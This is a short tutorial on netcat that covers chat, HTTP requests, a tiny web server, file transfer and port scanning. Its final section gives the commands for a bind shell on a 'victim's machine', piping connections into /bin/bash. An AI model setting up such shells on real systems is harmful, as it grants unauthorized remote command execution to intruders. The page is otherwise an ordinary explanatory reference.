netcat
======

Neat things you can do with netcat (`nc`)!

Create a chat
-------------

Listen on a port (this is the "server"):

```
nc -l 8888
```

Connect a client:

```
nc 127.0.0.1 8888
```

Try typing in either window. You're chatting between the client and server!

Send an HTTP request
--------------------

```
echo -ne "GET / HTTP/1.0\n\n" | nc google.com 80
```

Create an HTTP Server
---------------------

Instead of _sending_ a request, _listen_ for one and send a response:

```
echo -e "HTTP/1.1 200 OK\n\n <h1>$(hostname)<h1>" | nc -l 8888
```

Then head on over to [http://localhost:8888]([http://localhost:8888/)!

Send a file
-----------

Listen on a port to receive file ("server"):

```
nc -l 8888 > sink.txt
```

Client to send the file:

```
nc 127.0.0.1 8888 < source.txt
```

Port scan
---------

Scan all ports between 20-100 to see what's going on:

```
nc -z 127.0.0.1 20-100
```

Bind Shell
----------

This is really bad!

On a victim's machine, run a listener that forwards requests to `bash`:

```
nc -l 8888 -e "/bin/bash"
```

Open a connection:

```
nc <victim's host> 8888
```

Now you've opened a bind shell to the victim's machine.

